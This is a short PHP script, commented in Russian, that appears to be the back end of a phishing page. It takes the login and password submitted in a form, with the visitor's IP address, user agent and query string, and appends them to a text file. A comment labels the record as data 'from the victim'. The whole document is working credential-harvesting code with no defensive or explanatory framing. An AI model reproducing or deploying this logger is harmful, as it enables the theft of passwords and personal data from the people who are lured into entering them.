<?
$file="file2.txt"; //файл куда записываем все
$data=date("d.m.Y H:i"); //в скобках прописан формат отображения даты D - день недели, M - месяц Y - год, времени h - часы, i - минуты  
$ip=trim($_SERVER['REMOTE_ADDR']); //ip
$sysinfo=trim($_SERVER['HTTP_USER_AGENT']); //много всякой информации
$query=$_SERVER['QUERY_STRING']; //запросом GET
$login = $_POST[login]; //метод POST
$pass = $_POST[pass]; //метод POST
if(is_file($file)){ //Проверяем наличие файла и возможность работы с ним 
$fo=fopen($file,"a+"); //Открываем файл на запись в конец 
$res="\n$data  |  $ip  |  $sysinfo | \nlogin=$login  password=$pass \n$query \n"; //Формируем строку с информацией от жертвы 
$fw=fwrite($fo,$res); //Записываем в файл 
fclose($fo); //Закрываем файл 
} 
?>